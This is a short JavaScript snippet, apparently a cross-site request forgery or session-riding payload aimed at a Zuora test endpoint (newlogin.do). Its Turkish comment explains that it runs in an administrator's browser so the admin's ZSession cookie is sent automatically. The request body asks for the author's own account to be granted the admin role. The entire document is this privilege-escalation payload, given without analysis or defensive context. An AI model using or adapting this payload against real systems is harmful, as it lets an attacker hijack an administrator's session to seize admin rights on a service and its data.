fetch("https://test.zuora.com/apps/newlogin.do", {
    method: "POST",
    credentials: "include", // Admin'in tarayıcısından çalıştırıyoruz, ZSession token otomatik eklenir!
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ "user": "benim_hesabım", "role": "admin" })
});